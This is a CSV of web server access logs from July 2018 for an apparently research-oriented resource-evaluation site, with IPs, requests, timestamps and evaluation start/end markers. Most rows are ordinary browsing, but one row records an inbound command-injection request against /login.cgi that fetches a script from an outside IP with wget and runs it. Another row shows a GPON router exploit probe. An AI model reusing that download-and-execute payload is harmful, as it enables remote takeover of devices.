,ip,req,timestamp,marker,resourceID
333,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:03:58 +0000,,
334,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:03:58 2018,,
335,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:04:16 +0000,,
336,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:04:16 2018,,
337,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:04:17 +0000,,
338,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:04:29 +0000,,
339,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:04:29 2018,,
340,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:04:29 +0000,,
341,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:04:53 +0000,,
342,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:04:53 2018,,
343,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:04:53 +0000,,
344,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:04:59 +0000,,
345,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:04:59 2018,,
346,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:04:59 +0000,,
347,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:05:05 +0000,,
348,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:05:05 2018,,
349,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:05:05 +0000,,
350,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:05:08 +0000,,
351,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:05:08 2018,,
352,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:05:08 +0000,,
353,146.203.121.6,GET /newevaluation?resourceid=3384,19/Jul/2018:15:06:36 +0000,evalStart,3384
354,146.203.121.6,GET /newevaluation?resourceid=3384,Thu Jul 19 15:06:36 2018,evalStart,3384
355,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:07:24 2018,evalEnd,
356,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:07:25 +0000,evalEnd,
357,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:07:25 +0000,,
358,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:07:25 2018,,
359,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:08:29 2018,evalEnd,
360,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:08:29 +0000,evalEnd,
361,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:08:29 +0000,,
362,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:08:29 2018,,
363,146.203.121.6,GET /project/1/myevaluations/,19/Jul/2018:15:08:32 +0000,,
364,146.203.121.6,GET /project/1/myevaluations/,Thu Jul 19 15:08:32 2018,,
365,146.203.121.6,GET /project/1/myevaluations/page/2?,19/Jul/2018:15:08:35 +0000,,
366,146.203.121.6,GET /project/1/myevaluations/page/2?,Thu Jul 19 15:08:34 2018,,
367,146.203.121.6,GET /project/1/myevaluations/page/3?,19/Jul/2018:15:08:36 +0000,,
368,146.203.121.6,GET /project/1/myevaluations/page/3?,Thu Jul 19 15:08:36 2018,,
369,146.203.121.6,GET /project/1/myevaluations/page/4?,19/Jul/2018:15:08:38 +0000,,
370,146.203.121.6,GET /project/1/myevaluations/page/4?,Thu Jul 19 15:08:37 2018,,
371,146.203.121.6,GET /project/1/resources?,19/Jul/2018:15:08:39 +0000,,
372,146.203.121.6,GET /project/1/resources?,Thu Jul 19 15:08:39 2018,,
373,146.203.121.6,GET /newevaluation?resourceid=2567,19/Jul/2018:15:14:11 +0000,evalStart,2567
374,146.203.121.6,GET /newevaluation?resourceid=2567,Thu Jul 19 15:14:11 2018,evalStart,2567
375,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:17:20 2018,evalEnd,
376,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:17:20 +0000,evalEnd,
377,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:17:21 +0000,,
378,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:17:20 2018,,
379,156.221.49.150,POST /GponForm/diag_Form?images/,19/Jul/2018:15:19:51 +0000,,
380,146.203.121.6,GET /newevaluation?resourceid=1288,19/Jul/2018:15:24:19 +0000,evalStart,1288
381,146.203.121.6,GET /newevaluation?resourceid=1288,Thu Jul 19 15:24:19 2018,evalStart,1288
382,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:25:21 2018,evalEnd,
383,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:25:22 +0000,evalEnd,
384,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:25:22 +0000,,
385,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:25:22 2018,,
386,146.203.121.6,GET /newevaluation?resourceid=2037,19/Jul/2018:15:26:16 +0000,evalStart,2037
387,146.203.121.6,GET /newevaluation?resourceid=2037,Thu Jul 19 15:26:16 2018,evalStart,2037
388,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:27:18 2018,evalEnd,
389,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:27:19 +0000,evalEnd,
390,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:27:19 +0000,,
391,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:27:19 2018,,
392,129.171.150.188,GET /about,Thu Jul 19 15:27:42 2018,,
393,129.171.150.188,GET /about,19/Jul/2018:15:27:42 +0000,,
394,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:29:59 +0000,,
395,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:29:59 2018,,
396,146.203.121.6,GET /newevaluation?resourceid=1269,19/Jul/2018:15:30:00 +0000,evalStart,1269
397,146.203.121.6,GET /newevaluation?resourceid=1269,Thu Jul 19 15:30:00 2018,evalStart,1269
398,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:30:03 +0000,,
399,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:30:03 2018,,
400,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:30:04 +0000,,
401,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:30:04 +0000,,
402,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:30:04 2018,,
403,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:30:05 +0000,,
404,129.171.150.188,GET /project/1/resources,19/Jul/2018:15:30:05 +0000,,
405,129.171.150.188,GET /project/1/resources,Thu Jul 19 15:30:05 2018,,
406,129.171.150.188,GET /static/img/favicon.ico,19/Jul/2018:15:30:05 +0000,,
407,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:31:42 2018,evalEnd,
408,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:31:43 +0000,evalEnd,
409,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:31:43 +0000,,
410,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:31:43 2018,,
411,204.68.92.141,GET /,Thu Jul 19 15:36:07 2018,,
412,204.68.92.141,GET /,19/Jul/2018:15:36:07 +0000,,
413,204.68.92.141,GET /static/img/icon-32.png,19/Jul/2018:15:36:08 +0000,,
414,204.68.92.141,GET /static/img/favicon.ico,19/Jul/2018:15:36:08 +0000,,
415,146.203.121.6,GET /newevaluation?resourceid=326,19/Jul/2018:15:44:18 +0000,evalStart,326
416,146.203.121.6,GET /newevaluation?resourceid=326,Thu Jul 19 15:44:18 2018,evalStart,326
417,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:45:53 2018,evalEnd,
418,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:45:53 +0000,evalEnd,
419,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:45:53 +0000,,
420,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:45:53 2018,,
421,128.231.234.65,GET /,19/Jul/2018:15:49:29 +0000,,
422,128.231.234.65,GET /,Thu Jul 19 15:49:29 2018,,
423,128.231.234.65,GET /,19/Jul/2018:15:49:29 +0000,,
424,128.231.234.65,GET /static/img/icon-32.png,19/Jul/2018:15:49:29 +0000,,
425,128.231.234.65,GET /static/img/favicon.ico,19/Jul/2018:15:49:32 +0000,,
426,146.203.121.6,GET /newevaluation?resourceid=3760,19/Jul/2018:15:49:36 +0000,evalStart,3760
427,146.203.121.6,GET /newevaluation?resourceid=3760,Thu Jul 19 15:49:36 2018,evalStart,3760
428,177.139.29.75,GET /,19/Jul/2018:15:49:48 +0000,,
429,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:50:57 2018,evalEnd,
430,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:50:57 +0000,evalEnd,
431,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:50:58 +0000,,
432,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:50:57 2018,,
433,197.53.195.60,GET /login.cgi?cli=aa%20aa%27;wget%20http://104.244.72.82/k%20-O%20-%3E%20/tmp/k;sh%20/tmp/k%27$,19/Jul/2018:15:51:07 +0000,,
434,146.203.121.6,GET /newevaluation?resourceid=3762,19/Jul/2018:15:51:52 +0000,evalStart,3762
435,146.203.121.6,GET /newevaluation?resourceid=3762,Thu Jul 19 15:51:52 2018,evalStart,3762
436,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:53:44 2018,evalEnd,
437,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:53:44 +0000,evalEnd,
438,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:53:44 +0000,,
439,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:53:44 2018,,
440,128.231.133.102,GET /,19/Jul/2018:15:54:14 +0000,,
441,128.231.133.102,GET /,Thu Jul 19 15:54:14 2018,,
442,128.231.133.102,GET /,19/Jul/2018:15:54:14 +0000,,
443,128.231.133.102,GET /static/img/icon-32.png,19/Jul/2018:15:54:18 +0000,,
444,128.231.133.102,GET /static/img/favicon.ico,19/Jul/2018:15:54:19 +0000,,
445,146.203.121.6,GET /newevaluation?resourceid=3376,19/Jul/2018:15:54:42 +0000,evalStart,3376
446,146.203.121.6,GET /newevaluation?resourceid=3376,Thu Jul 19 15:54:42 2018,evalStart,3376
447,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 15:56:57 2018,evalEnd,
448,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:15:56:57 +0000,evalEnd,
449,146.203.121.6,GET /project/1/resources,19/Jul/2018:15:56:57 +0000,,
450,146.203.121.6,GET /project/1/resources,Thu Jul 19 15:56:57 2018,,
451,146.203.121.6,GET /newevaluation?resourceid=1174,19/Jul/2018:16:01:37 +0000,evalStart,1174
452,146.203.121.6,GET /newevaluation?resourceid=1174,Thu Jul 19 16:01:37 2018,evalStart,1174
453,70.42.131.170,GET /about,19/Jul/2018:16:07:14 +0000,,
454,70.42.131.170,GET /about,Thu Jul 19 16:07:14 2018,,
455,70.42.131.170,GET /about,19/Jul/2018:16:07:14 +0000,,
456,70.42.131.170,GET /static/img/icon-32.png,19/Jul/2018:16:07:15 +0000,,
457,170.250.50.224,GET /,Thu Jul 19 16:12:41 2018,,
458,170.250.50.224,GET /,19/Jul/2018:16:12:41 +0000,,
459,170.250.50.224,GET /static/img/icon-32.png,19/Jul/2018:16:12:42 +0000,,
460,40.107.222.49,GET /,Thu Jul 19 16:12:53 2018,,
461,40.107.222.49,GET /,19/Jul/2018:16:12:53 +0000,,
462,40.107.222.4,GET /static/img/icon-32.png,19/Jul/2018:16:12:57 +0000,,
463,40.107.222.54,GET /static/img/favicon.ico,19/Jul/2018:16:13:01 +0000,,
464,170.250.50.224,GET /static/img/favicon.ico,19/Jul/2018:16:13:10 +0000,,
465,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 16:24:05 2018,evalEnd,
466,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:16:24:05 +0000,evalEnd,
467,146.203.121.6,GET /project/1/resources,19/Jul/2018:16:24:05 +0000,,
468,146.203.121.6,GET /project/1/resources,Thu Jul 19 16:24:05 2018,,
469,146.203.121.6,GET /static/img/icon-32.png,19/Jul/2018:16:24:05 +0000,,
470,146.203.121.6,GET /newevaluation?resourceid=811,19/Jul/2018:16:27:19 +0000,evalStart,811
471,146.203.121.6,GET /newevaluation?resourceid=811,Thu Jul 19 16:27:19 2018,evalStart,811
472,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 16:30:53 2018,evalEnd,
473,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:16:30:53 +0000,evalEnd,
474,146.203.121.6,GET /project/1/resources,19/Jul/2018:16:30:53 +0000,,
475,146.203.121.6,GET /project/1/resources,Thu Jul 19 16:30:53 2018,,
476,146.203.121.6,GET /newevaluation?resourceid=3033,19/Jul/2018:16:32:20 +0000,evalStart,3033
477,146.203.121.6,GET /newevaluation?resourceid=3033,Thu Jul 19 16:32:20 2018,evalStart,3033
478,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 16:34:26 2018,evalEnd,
479,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:16:34:26 +0000,evalEnd,
480,146.203.121.6,GET /project/1/resources,19/Jul/2018:16:34:26 +0000,,
481,146.203.121.6,GET /project/1/resources,Thu Jul 19 16:34:26 2018,,
482,146.203.121.6,GET /project/1/myevaluations?,Thu Jul 19 16:37:06 2018,,
483,146.203.121.6,GET /project/1/myevaluations?,19/Jul/2018:16:37:06 +0000,,
484,146.203.121.6,GET /project/1/myevaluations/,19/Jul/2018:16:37:08 +0000,,
485,146.203.121.6,GET /project/1/myevaluations/,Thu Jul 19 16:37:06 2018,,
486,146.203.121.6,GET /project/1/myevaluations/page/2?,19/Jul/2018:16:37:11 +0000,,
487,146.203.121.6,GET /project/1/myevaluations/page/2?,Thu Jul 19 16:37:10 2018,,
488,146.203.121.6,GET /project/1/myevaluations/page/3?,19/Jul/2018:16:37:15 +0000,,
489,146.203.121.6,GET /project/1/myevaluations/page/3?,Thu Jul 19 16:37:13 2018,,
490,146.203.121.6,GET /project/1/myevaluations/page/4?,19/Jul/2018:16:37:17 +0000,,
491,146.203.121.6,GET /project/1/myevaluations/page/4?,Thu Jul 19 16:37:16 2018,,
492,146.203.121.6,GET /project/1/myevaluations/page/5?,19/Jul/2018:16:37:20 +0000,,
493,146.203.121.6,GET /project/1/myevaluations/page/5?,Thu Jul 19 16:37:19 2018,,
494,146.203.121.6,GET /project/1/myevaluations/page/6?,19/Jul/2018:16:37:23 +0000,,
495,146.203.121.6,GET /project/1/myevaluations/page/6?,Thu Jul 19 16:37:21 2018,,
496,146.203.121.6,GET /project/1/myevaluations/page/7?,19/Jul/2018:16:37:26 +0000,,
497,146.203.121.6,GET /project/1/myevaluations/page/7?,Thu Jul 19 16:37:25 2018,,
498,146.203.121.6,GET /project/1/myevaluations/page/8?,19/Jul/2018:16:37:30 +0000,,
499,146.203.121.6,GET /project/1/myevaluations/page/8?,Thu Jul 19 16:37:28 2018,,
500,146.203.121.6,GET /project/1/myevaluations/page/9?,19/Jul/2018:16:37:33 +0000,,
501,146.203.121.6,GET /project/1/myevaluations/page/9?,Thu Jul 19 16:37:32 2018,,
502,146.203.121.6,GET /project/1/myevaluations/page/10?,19/Jul/2018:16:37:36 +0000,,
503,146.203.121.6,GET /project/1/myevaluations/page/10?,Thu Jul 19 16:37:35 2018,,
504,146.203.121.6,GET /project/1/resources?,19/Jul/2018:16:37:40 +0000,,
505,146.203.121.6,GET /project/1/resources?,Thu Jul 19 16:37:40 2018,,
506,146.203.121.6,GET /newevaluation?resourceid=3675,19/Jul/2018:16:38:55 +0000,evalStart,3675
507,146.203.121.6,GET /newevaluation?resourceid=3675,Thu Jul 19 16:38:55 2018,evalStart,3675
508,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 16:40:53 2018,evalEnd,
509,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:16:40:53 +0000,evalEnd,
510,146.203.121.6,GET /project/1/resources,19/Jul/2018:16:40:53 +0000,,
511,146.203.121.6,GET /project/1/resources,Thu Jul 19 16:40:53 2018,,
512,204.68.92.141,GET /,Thu Jul 19 16:44:08 2018,,
513,204.68.92.141,GET /,19/Jul/2018:16:44:08 +0000,,
514,204.68.92.141,GET /register,Thu Jul 19 16:44:11 2018,,
515,204.68.92.141,GET /register,19/Jul/2018:16:44:11 +0000,,
516,204.68.92.141,POST /register,Thu Jul 19 16:45:07 2018,,
517,204.68.92.141,POST /register,19/Jul/2018:16:45:07 +0000,,
518,204.68.92.141,GET /login,Thu Jul 19 16:45:07 2018,,
519,204.68.92.141,GET /login,19/Jul/2018:16:45:07 +0000,,
520,204.68.92.141,POST /login,Thu Jul 19 16:45:23 2018,,
521,204.68.92.141,POST /login,19/Jul/2018:16:45:23 +0000,,
522,204.68.92.141,GET /login,Thu Jul 19 16:45:23 2018,,
523,204.68.92.141,GET /login,19/Jul/2018:16:45:23 +0000,,
524,204.68.92.141,POST /login,Thu Jul 19 16:45:28 2018,,
525,204.68.92.141,POST /login,19/Jul/2018:16:45:28 +0000,,
526,204.68.92.141,GET /,19/Jul/2018:16:45:28 +0000,,
527,204.68.92.141,GET /,Thu Jul 19 16:45:28 2018,,
528,204.68.92.141,GET /project/1/resources,19/Jul/2018:16:45:30 +0000,,
529,204.68.92.141,GET /project/1/resources,Thu Jul 19 16:45:30 2018,,
530,204.68.92.141,GET /login,19/Jul/2018:16:45:33 +0000,,
531,204.68.92.141,GET /login,Thu Jul 19 16:45:33 2018,,
532,204.68.92.141,POST /login,Thu Jul 19 16:45:37 2018,,
533,204.68.92.141,POST /login,19/Jul/2018:16:45:37 +0000,,
534,204.68.92.141,GET /,19/Jul/2018:16:45:37 +0000,,
535,204.68.92.141,GET /,Thu Jul 19 16:45:37 2018,,
536,204.68.92.141,GET /project/1/resources,19/Jul/2018:16:45:41 +0000,,
537,204.68.92.141,GET /project/1/resources,Thu Jul 19 16:45:41 2018,,
538,204.68.92.141,GET /project/1/myevaluations?,Thu Jul 19 16:45:43 2018,,
539,204.68.92.141,GET /project/1/myevaluations?,19/Jul/2018:16:45:43 +0000,,
540,204.68.92.141,GET /project/1/myevaluations/,19/Jul/2018:16:45:43 +0000,,
541,204.68.92.141,GET /project/1/myevaluations/,Thu Jul 19 16:45:43 2018,,
542,204.68.92.141,GET /project/1/resources?,19/Jul/2018:16:45:44 +0000,,
543,204.68.92.141,GET /project/1/resources?,Thu Jul 19 16:45:44 2018,,
544,204.68.92.141,GET /newevaluation?resourceid=334,19/Jul/2018:16:46:24 +0000,evalStart,334
545,204.68.92.141,GET /newevaluation?resourceid=334,Thu Jul 19 16:46:24 2018,evalStart,334
546,46.4.63.250,GET /robots.txt,Thu Jul 19 17:01:04 2018,,
547,46.4.63.250,GET /robots.txt,19/Jul/2018:17:01:04 +0000,,
548,46.4.63.250,GET /,Thu Jul 19 17:01:06 2018,,
549,46.4.63.250,GET /,19/Jul/2018:17:01:06 +0000,,
550,46.4.63.250,GET /about,Thu Jul 19 17:01:08 2018,,
551,46.4.63.250,GET /about,19/Jul/2018:17:01:08 +0000,,
552,46.4.63.250,GET /forgotpassword,Thu Jul 19 17:01:09 2018,,
553,46.4.63.250,GET /forgotpassword,19/Jul/2018:17:01:09 +0000,,
554,46.4.63.250,GET /login,Thu Jul 19 17:01:11 2018,,
555,46.4.63.250,GET /login,19/Jul/2018:17:01:11 +0000,,
556,46.4.63.250,GET /project/1/resources,19/Jul/2018:17:01:14 +0000,,
557,46.4.63.250,GET /project/1/resources,Thu Jul 19 17:01:13 2018,,
558,46.4.63.250,GET /register,Thu Jul 19 17:01:16 2018,,
559,46.4.63.250,GET /register,19/Jul/2018:17:01:16 +0000,,
560,70.42.131.170,GET /evaluationsubmitted,19/Jul/2018:17:04:02 +0000,evalEnd,
561,70.42.131.170,GET /evaluationsubmitted,Thu Jul 19 17:04:02 2018,evalEnd,
562,70.42.131.170,GET /evaluationsubmitted,19/Jul/2018:17:04:02 +0000,evalEnd,
563,41.87.198.107,GET /,19/Jul/2018:17:14:30 +0000,,
564,146.203.121.6,GET /,19/Jul/2018:17:45:19 +0000,,
565,146.203.121.6,GET /,Thu Jul 19 17:45:19 2018,,
566,146.203.121.6,GET /,19/Jul/2018:17:45:19 +0000,,
567,35.153.74.211,GET /,19/Jul/2018:17:49:51 +0000,,
568,35.153.74.211,GET /,Thu Jul 19 17:49:51 2018,,
569,35.153.74.211,GET /,19/Jul/2018:17:49:51 +0000,,
570,35.153.74.211,GET /static/img/icon-32.png,19/Jul/2018:17:49:51 +0000,,
571,146.203.121.6,GET /project/1/resources,19/Jul/2018:17:53:55 +0000,,
572,146.203.121.6,GET /project/1/resources,Thu Jul 19 17:53:55 2018,,
573,146.203.121.6,GET /static/img/icon-32.png,19/Jul/2018:17:53:55 +0000,,
574,146.203.121.6,GET /newevaluation?resourceid=332,19/Jul/2018:17:53:59 +0000,evalStart,332
575,146.203.121.6,GET /newevaluation?resourceid=332,Thu Jul 19 17:53:59 2018,evalStart,332
576,146.203.121.6,GET /newevaluation?resourceid=1855,19/Jul/2018:17:54:07 +0000,evalStart,1855
577,146.203.121.6,GET /newevaluation?resourceid=1855,Thu Jul 19 17:54:07 2018,evalStart,1855
578,70.42.131.170,GET /newevaluation%3fresourceid=1482,19/Jul/2018:17:55:40 +0000,evalStart,1482
579,70.42.131.170,GET /newevaluation?resourceid=1482,Thu Jul 19 17:55:40 2018,evalStart,1482
580,70.42.131.170,GET /newevaluation?resourceid=1482,19/Jul/2018:17:55:40 +0000,evalStart,1482
581,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D1482,19/Jul/2018:17:55:41 +0000,,
582,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D1482,Thu Jul 19 17:55:41 2018,,
583,70.42.131.170,GET /static/img/icon-32.png,19/Jul/2018:17:55:41 +0000,,
584,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 17:56:34 2018,evalEnd,
585,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:17:56:34 +0000,evalEnd,
586,146.203.121.6,GET /project/1/resources,19/Jul/2018:17:56:35 +0000,,
587,146.203.121.6,GET /project/1/resources,Thu Jul 19 17:56:34 2018,,
588,146.203.121.6,GET /project/1/myevaluations/,19/Jul/2018:17:56:42 +0000,,
589,146.203.121.6,GET /project/1/myevaluations/,Thu Jul 19 17:56:40 2018,,
590,146.203.121.6,GET /project/1/myevaluations/page/2?,19/Jul/2018:17:56:45 +0000,,
591,146.203.121.6,GET /project/1/myevaluations/page/2?,Thu Jul 19 17:56:44 2018,,
592,146.203.121.6,GET /project/1/myevaluations/page/3?,19/Jul/2018:17:56:49 +0000,,
593,146.203.121.6,GET /project/1/myevaluations/page/3?,Thu Jul 19 17:56:48 2018,,
594,146.203.121.6,GET /project/1/myevaluations/page/4?,19/Jul/2018:17:56:52 +0000,,
595,146.203.121.6,GET /project/1/myevaluations/page/4?,Thu Jul 19 17:56:50 2018,,
596,146.203.121.6,GET /project/1/myevaluations/page/5?,19/Jul/2018:17:56:56 +0000,,
597,146.203.121.6,GET /project/1/myevaluations/page/5?,Thu Jul 19 17:56:54 2018,,
598,146.203.121.6,GET /project/1/myevaluations/page/6?,19/Jul/2018:17:56:59 +0000,,
599,146.203.121.6,GET /project/1/myevaluations/page/6?,Thu Jul 19 17:56:57 2018,,
600,146.203.121.6,GET /project/1/myevaluations/page/7?,19/Jul/2018:17:57:02 +0000,,
601,146.203.121.6,GET /project/1/myevaluations/page/7?,Thu Jul 19 17:57:00 2018,,
602,146.203.121.6,GET /project/1/myevaluations/page/8?,19/Jul/2018:17:57:05 +0000,,
603,146.203.121.6,GET /project/1/myevaluations/page/8?,Thu Jul 19 17:57:03 2018,,
604,146.203.121.6,GET /project/1/myevaluations/page/9?,19/Jul/2018:17:57:08 +0000,,
605,146.203.121.6,GET /project/1/myevaluations/page/9?,Thu Jul 19 17:57:06 2018,,
606,146.203.121.6,GET /project/1/myevaluations/page/10?,19/Jul/2018:17:57:11 +0000,,
607,146.203.121.6,GET /project/1/myevaluations/page/10?,Thu Jul 19 17:57:10 2018,,
608,146.203.121.6,GET /project/1/myevaluations/page/9?,19/Jul/2018:17:57:14 +0000,,
609,146.203.121.6,GET /project/1/myevaluations/page/9?,Thu Jul 19 17:57:13 2018,,
610,146.203.121.6,GET /project/1/resources?,19/Jul/2018:17:57:16 +0000,,
611,146.203.121.6,GET /project/1/resources?,Thu Jul 19 17:57:16 2018,,
612,146.203.121.6,GET /project/1/myevaluations/,19/Jul/2018:17:57:19 +0000,,
613,146.203.121.6,GET /project/1/myevaluations/,Thu Jul 19 17:57:18 2018,,
614,146.203.121.6,GET /project/1/resources?,19/Jul/2018:17:57:27 +0000,,
615,146.203.121.6,GET /project/1/resources?,Thu Jul 19 17:57:27 2018,,
616,204.68.92.141,POST /evaluationsubmitted,Thu Jul 19 18:16:03 2018,evalEnd,
617,204.68.92.141,POST /evaluationsubmitted,19/Jul/2018:18:16:03 +0000,evalEnd,
618,204.68.92.141,GET /project/1/resources,19/Jul/2018:18:16:03 +0000,,
619,204.68.92.141,GET /project/1/resources,Thu Jul 19 18:16:03 2018,,
620,204.68.92.141,GET /static/img/icon-32.png,19/Jul/2018:18:16:04 +0000,,
